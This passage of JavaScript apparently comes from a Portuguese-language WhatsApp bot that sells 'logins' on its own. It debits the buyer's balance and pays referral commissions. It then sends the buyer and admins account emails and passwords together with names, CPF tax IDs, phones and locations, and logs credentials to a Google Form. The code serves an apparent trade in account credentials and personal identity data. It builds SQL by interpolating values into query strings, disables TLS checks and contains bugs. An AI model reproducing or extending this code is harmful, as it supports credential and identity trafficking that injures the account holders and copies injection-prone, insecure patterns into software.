                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
                SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
                if (parseFloat(SALDO_USUARIO) < parseFloat(PRECO_LOGIN)) {

                    Texto = `⚠️*Você não possui saldo suficiente para comprar este Login.*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(PRECO_LOGIN)
                NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

                await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
                await DataBase_Better.prepare(`INSERT INTO LOGINS_VENDIDOS (SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,NUMERO_COMPRADOR,DATA_MS_INSERIDO) VALUES ('${SERVICO}','${EMAIL}','${SENHA}','${NOME}','${CPF}','${USER}','${TELEFONE}','${ESTADO}','${CIDADE}','${ADICIONAIS}','${PRECO}','${Mensagem_From}','${Date.now()}')`).run()
                await DataBase_Better.prepare(`DELETE FROM LOGINS WHERE _rowid_ = ${ID}`).run()

                VALOR_BASE_INDIC = PRECO_LOGIN
                Contato_Temp_Indic = Mensagem_From
                FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
                if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                    ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                    if (ATIVAR_ASSOCIADOS === "1") {

                        Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                        if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                            NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
                            PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                            if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                                PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                            } else {
                                PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                            }

                            PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                            if (PIX_OU_COMPRA === "1") {

                            } else if (PIX_OU_COMPRA === "2") {
                                VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                                VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                                console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                                SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                                SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                                console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                                NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                                NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                                console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                                await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                                console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
                            }
                        }
                    }
                }

                ATIVAR_LOG_LOGINVENDA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_LOG_LOGINVENDA'`).get()["VALOR"]
                if (ATIVAR_LOG_LOGINVENDA === "1") {
                    ID_FORMULARIO_LOG_LOGINVENDA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ID_FORMULARIO_LOG_LOGINVENDA'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA1 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA1'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA2'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA3 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA3'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA4 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA4'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA5 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA5'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA6 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA6'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA7 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA7'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA8 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA8'`).get()["VALOR"]

                    Mensagem_Nome_plan = Mensagem_Nome.replace(/[^0-9\sa-zA-Z]/igm, "")
                    SERVICO_plan = SERVICO.replace(/[^0-9\sa-zA-Z]/igm, "")
                    SERVICO_plan = SERVICO.replace(/[^0-9\sa-zA-Z]/igm, "")

                    if (CPF.toString() === "§") {
                        DADOS_plan = ADICIONAIS.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
                        DADOS_plan = DADOS_plan.replace(/\\n/igm, " ")
                        URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
                    } else if (CPF.toString() === "§§" || CPF.toString() === "0") {
                        EMAIL_plan = EMAIL.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
                        DADOS_plan = `Email:${EMAIL_plan} Senha:${SENHA}`
                        URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
                    } else {
                        DADOS_plan = ADICIONAIS.replace(/[^\@\.0-9\sa-zA-Z]/igm, "")
                        DADOS_plan = DADOS_plan.replace(/\\n/igm, " ")
                        URL_plan = `https://docs.google.com/forms/d/e/${ID_FORMULARIO_LOG_LOGINVENDA}/formResponse?entry.${ENTRY_FORM_LOG_LOGINVENDA1}=${Mensagem_Nome_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA2}=${Numero}&entry.${ENTRY_FORM_LOG_LOGINVENDA3}=${SERVICO_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA4}=${DADOS_plan}&entry.${ENTRY_FORM_LOG_LOGINVENDA5}=${PRECO_LOGIN}&entry.${ENTRY_FORM_LOG_LOGINVENDA6}=${NOVO_SALDO}&entry.${ENTRY_FORM_LOG_LOGINVENDA7}=${new Date(parseInt(Date.now())).toLocaleString()}&entry.${ENTRY_FORM_LOG_LOGINVENDA8}=${new Date(parseInt(Date.now() + 2629800000)).toLocaleString()}`
                    }
                    var options = {
                        'method': 'POST',
                        'url': URL_plan,
                        rejectUnauthorized: false,
                    };
                    request(options, function (error, response) {
                        if (error) throw new Error(error);
                        console.log(`Logs enviados para planilha.`);
                    });
                }


                MENSAGEM_AO_COMPRAR_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_LOGIN'`).get()["VALOR"]

                if (CPF.toString() === "§") {
                    Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString().split(" ")[0]}
⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString().split(" ")[0]}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

${ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_LOGIN}`
                } else if (CPF.toString() === "§§") {
                    Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString().split(" ")[0]}
⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString().split(" ")[0]}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

Ⓜ️EMAIL: ${EMAIL}
🔐SENHA: ${SENHA}

${ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_LOGIN}`

                } else {
                    Texto_Usuario = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString().split(" ")[0]}
⏰ *DATA RENOVAÇÃO:* ${new Date(parseInt(Date.now() + 2629800000)).toLocaleString().split(" ")[0]}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

Ⓜ️EMAIL: ${EMAIL}
🔐SENHA: ${SENHA}
👤NOME: ${NOME}
👤CPF: ${CPF}
👤USER: ${USER}
📱TELEFONE: ${TELEFONE}
🏞️ESTADO: ${ESTADO}
🏭CIDADE: ${CIDADE}

${ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_LOGIN}`

                }
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto_Grupo = `📱 *USUÁRIO COMPROU UMA LOGIN* 📱

👤 *USUÁRIO:* wa.me/${Numero}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

*VENHA ADQUIRIR OS MELHORES LOGINS DO MERCADO!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`

                NOT_COMPROU_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_LOGIN'`).get()["VALOR"]
                if (NOT_COMPROU_LOGIN === "1") {
                    for await (Grupo of ID_GRUPOS) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Login_GP}',
'${Date.now()}')`).run()
                    }
                }

                Texto_Adms = `📱 *LOGIN COMPRADO COM SUCESSO* 📱

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}

💰 *VALOR LOGIN:* R$: ${PRECO_LOGIN}

⚜️ *${SERVICO}* ⚜️

Ⓜ️EMAIL: ${EMAIL}
🔐SENHA: ${SENHA}
👤NOME: ${NOME}
👤CPF: ${CPF}
👤USER: ${USER}
📱TELEFONE: ${TELEFONE}
🏞️ESTADO: ${ESTADO}
🏭CIDADE: ${CIDADE}

${ADICIONAIS}`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                console.log(`Login Comprado! Numero: wa.me/${Numero} | Valor: ${PRECO_LOGIN}`)
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            if (Mensagem_ID_Lista_Array_Partes[1] === "id_login_sera_comprado") {

                ID = Mensagem_ID_Lista_Array_Partes[2]

                ROWID = await DataBase_Better.prepare(`SELECT _rowid_ FROM LOGINS WHERE _rowid_ = '${ID}'`).get()
                if (ROWID === undefined) {
                    Texto = `Desculpe, outra pessoa comprou este Login, escolha outro!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                item = await DataBase_Better.prepare(`SELECT _rowid_,SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO FROM LOGINS WHERE _rowid_ = '${ID}'`).get();

                ID = item["rowid"]
                SERVICO = item["SERVICO"]
                EMAIL = item["EMAIL"]
                SENHA = item["SENHA"]
                NOME = item["NOME"]
                CPF = item["CPF"]
                USER = item["USER"]
                TELEFONE = item["CPF"]
                ESTADO = item["ESTADO"]
                CIDADE = item["CIDADE"]
                ADICIONAIS = item["ADICIONAIS"]
                PRECO = item["PRECO"]

                PRECO_LOGIN = parseFloat(PRECO).toFixed(2)
                if (parseFloat(PRECO) === 0 || parseFloat(PRECO) === 0.00) {

                    Texto = `Não foi possível efetuar a compra deste Login, pois o valor do mesmo não foi definido. Nossa equipe foi notificada!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    Texto = `*ATENÇÃO ADM*

Numero: wa.me/${Numero}, Tentou comprar um Login que não possui preço definido.

REVISE AS TABELAS DE PREÇOS E DEFINA OS PREÇOS DOS LOGINS COM CUSTO R$:0`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
                SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
                if (parseFloat(SALDO_USUARIO) < parseFloat(PRECO_LOGIN)) {

                    Texto = `⚠️*Você não possui saldo suficiente para comprar este Login.*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(PRECO_LOGIN)
                NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

                await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
                await DataBase_Better.prepare(`INSERT INTO LOGINS_VENDIDOS (SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,NUMERO_COMPRADOR,DATA_MS_INSERIDO) VALUES ('${SERVICO}','${EMAIL}','${SENHA}','${NOME}','${CPF}','${USER}','${TELEFONE}','${ESTADO}','${CIDADE}','${ADICIONAIS}','${PRECO}','${Mensagem_From}','${Date.now()}')`).run()
                await DataBase_Better.prepare(`DELETE FROM LOGINS WHERE _rowid_ = ${ID}`).run()

                VALOR_BASE_INDIC = PRECO_LOGIN
                Contato_Temp_Indic = Mensagem_From
                FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
                if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                    ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                    if (ATIVAR_ASSOCIADOS === "1") {

                        Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                        if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                            NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
                            PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                            if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                                PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                            } else {
                                PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                            }

                            PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                            if (PIX_OU_COMPRA === "1") {

                            } else if (PIX_OU_COMPRA === "2") {
                                VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                                VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                                console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                                SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                                SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                                console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                                NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                                NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                                console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                                await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                                console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
                            }
                        }
                    }
                }

                ATIVAR_LOG_LOGINVENDA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_LOG_LOGINVENDA'`).get()["VALOR"]
                if (ATIVAR_LOG_LOGINVENDA === "1") {
                    ID_FORMULARIO_LOG_LOGINVENDA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ID_FORMULARIO_LOG_LOGINVENDA'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA1 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA1'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA2'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA3 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA3'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA4 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA4'`).get()["VALOR"]
                    ENTRY_FORM_LOG_LOGINVENDA5 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ENTRY_FORM_LOG_LOGINVENDA5'`).get()["VALOR"]
